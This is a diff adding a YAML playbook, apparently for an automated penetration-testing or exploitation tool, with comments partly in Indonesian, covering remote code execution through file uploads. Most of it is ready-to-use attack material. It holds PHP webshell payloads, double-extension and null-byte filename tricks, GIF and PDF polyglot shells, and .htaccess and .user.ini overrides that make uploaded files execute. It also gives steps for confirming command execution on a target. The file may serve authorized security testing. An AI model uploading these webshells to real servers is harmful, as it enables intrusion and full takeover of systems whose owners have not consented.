@@ -1,0 +1,65 @@
+name: rce_upload
+description: Remote Code Execution via file upload
+phase: exploit
+priority: 10
+
+conditions:
+  triggers:
+    - Endpoint upload file (avatar, attachment, import, document)
+    - File disimpan di webroot atau public path
+    - Ekstensi file tidak divalidasi strict
+    - Content-Type bisa dimanipulasi
+  not_recommended:
+    - File disimpan di external storage (S3, GCS) via signed URL
+    - Ekstensi divalidasi dengan whitelist + re-encode
+    - File dibaca via X-Sendfile / internal redirect (bukan langsung)
+    - Content-Type strict + magic byte validation
+
+payloads:
+  webshell:
+    - name: "shell.php"
+      content: "<?php system($_GET['cmd']); ?>"
+    - name: "shell.php5"
+      content: "<?php system($_GET['cmd']); ?>"
+    - name: "shell.phtml"
+      content: "<?php system($_GET['cmd']); ?>"
+  double_extension:
+    - "shell.php.jpg"
+    - "shell.php.txt"
+    - "shell.php%00.jpg"
+  polyglot:
+    - name: "shell.gif"
+      content: "GIF89a<?php system($_GET['cmd']); ?>"
+    - name: "shell.pdf"
+      content: "%PDF-1.4<?php system($_GET['cmd']); ?>"
+  htaccess:
+    - name: ".htaccess"
+      content: "AddType application/x-httpd-php .txt"
+    - name: ".user.ini"
+      content: "auto_prepend_file=shell.gif"
+
+tools:
+  primary: manual (curl/httpx + python)
+  automated: [burp_upload_scanner]
+  manual: [curl, httpx, python, playwright]
+
+validation:
+  method: deterministic
+  rules:
+    - type: direct_access
+      method: "upload → akses URL file → file exists"
+    - type: code_execution
+      method: "upload webshell → GET ?cmd=id → response contains uid="
+    - type: polyglot
+      method: "upload GIF+PHP → akses → eksekusi → output"
+  reject_if:
+    - "File terupload tapi langsung dihapus/rename"
+    - "File bisa diakses tapi content-type bukan application/x-httpd-php"
+    - "Execusi command tapi output kosong (disable_functions)"
+    - "Magic bytes validated ketat (GIF89a ditolak meskipun valid GIF)"
+
+examples:
+  - target: "/upload/avatar"
+    payload: "shell.php (magic bytes PNG)"
+    indicator: "upload shell → akses /uploads/shell.php?cmd=id"
+    tool: "curl"
